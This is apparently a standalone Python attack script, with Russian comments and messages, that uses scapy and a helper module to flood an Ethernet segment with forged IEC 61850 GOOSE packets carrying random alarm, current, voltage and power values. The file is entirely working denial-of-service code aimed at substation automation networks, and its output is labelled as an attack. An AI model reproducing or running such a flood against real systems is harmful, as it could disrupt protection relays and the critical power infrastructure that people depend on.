#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import random
from goose_gen import build_goose_packet
from scapy.all import sendp

src_mac = "02:0F:1E:3D:5C:7B"
dst_mac = "FF:FF:FF:FF:FF:FF"
iface = "eth0"
goCBRef = "GOOSEControlBlock1"
datSet = "DataSet1"
goID = "GOOSE_ID_1"
confRev = 1

st_num = 1
sq_num = 1
start_time = time.time()
print("[ATTACK] Запуск DoS-атаки (флуд GOOSE-пакетами)...")
print("Нажми Ctrl+C для остановки.")

# Счетчик отправленных пакетов
packet_count = 0

try:
    while True:
        alarm_state = random.random() < 0.5
        current = random.randint(1, 100)
        voltage = random.randint(210, 250)
        power = int((current * voltage) / 1000)

        all_data = [alarm_state, current, voltage, power]
        pkt = build_goose_packet(
            src_mac, dst_mac, st_num, sq_num,
            goCBRef, datSet, goID, confRev, all_data
        )
        sendp(pkt, iface=iface, verbose=False)
        packet_count += 1

        if alarm_state:
            st_num += 1
            sq_num = 1
        else:
            sq_num += 1


        time.sleep(0.001)

        if packet_count % 100 == 0:
            print(f"[ATTACK] Отправлено {packet_count} пакетов за {time.time() - start_time:.1f}с")

except KeyboardInterrupt:
    print(f"\n[ATTACK] Остановлено. Всего отправлено {packet_count} пакетов.")